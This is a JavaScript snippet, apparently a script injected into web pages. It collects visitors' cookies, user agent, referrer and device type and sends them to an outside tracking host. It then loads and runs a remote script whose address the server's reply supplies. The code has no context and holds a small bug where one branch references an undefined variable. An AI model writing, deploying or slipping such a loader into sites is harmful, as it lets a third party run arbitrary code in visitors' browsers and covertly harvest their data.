!function() {
    var e = window.location.href,
        n = u(),
        t = navigator.userAgent,
        o = document.referrer;
    function r(e) {
        return document.cookie.split("; ").reduce(((n, t) => {
            const [o, r] = t.split("=");
            return o === encodeURIComponent(e) ? decodeURIComponent(r) : n
        }), null)
    }
    const i = r("PID"),
        a = r("AID");
    var c = r("re_ret_site");
    function d(e, n) {
        document.cookie = `${encodeURIComponent(e)}=${encodeURIComponent(n)}; expires=${new Date(Date.now() + 864e5).toUTCString()}; path=/`
    }
    i || d("re_ret_pid", x()),
    a != encodeURIComponent(o) && d("re_ret_aid", encodeURIComponent(o));
    let s = parseInt(r("re_ret_page")) + 1 || 1;
    function u() {
        var e = navigator.userAgent;
        return /iPhone|iPad|iPod/i.test(e) ? "iOS" : /Android/i.test(e) ? "Android" : /Windows Phone/i.test(e) ? "Windows Phone" : /Windows NT/i.test(e) ? "Windows" : /Macintosh/i.test(e) ? "Mac" : /Linux/i.test(e) ? "Linux" : "Unknown"
    }
    function x() {
        var e = (new Date).getTime(),
            n = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(n) {
                var t = (e + 16 * Math.random()) % 16 | 0;
                return e = Math.floor(e / 16), ("x" == n ? t : 3 & t | 8).toString(16)
            }));
        return n
    }
    d("re_ret_page", s),
    c || d("re_ret_site", c = Math.floor(100 * Math.random()) + 1),
    "Windows" == u() || "Mac" == u() || u();
    var p = window.wwData || [];
    p.push({
        event: "viewPage",
        uxid: x(),
        page: e,
        device_type: n,
        uAgent: t,
        referrer: a
    });
    let h = {
        url: window.location.href,
        referrer: document.referrer,
        coo: JSON.stringify(i),
        origin: window.location.hostname,
        data: p,
        pcounts: s,
        i: c
    };
    const m = "https://www.tracktraffics.com/api/track-data";
    fetch(m, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(h)
    }).then((e => e.json())).then((e => {
        var n,
            t,
            o;
        "success" == e.status && (e.script ? (n = e.affiliate_url, t = document.createElement("script"), o = n, t.src = o, t.async = !0, document.head.appendChild(t)) : function(e) {
            var n = e.name,
                t = e.affiliate_url,
                o = document.createElement("script"),
                r = encodeURIComponent(t);
            o.src = affiliate_url,
            o.async = !0,
            document.head.appendChild(o)
        }(e))
    })).catch((e => {
        console.error("Fetch failed: ", e)
    }))
}();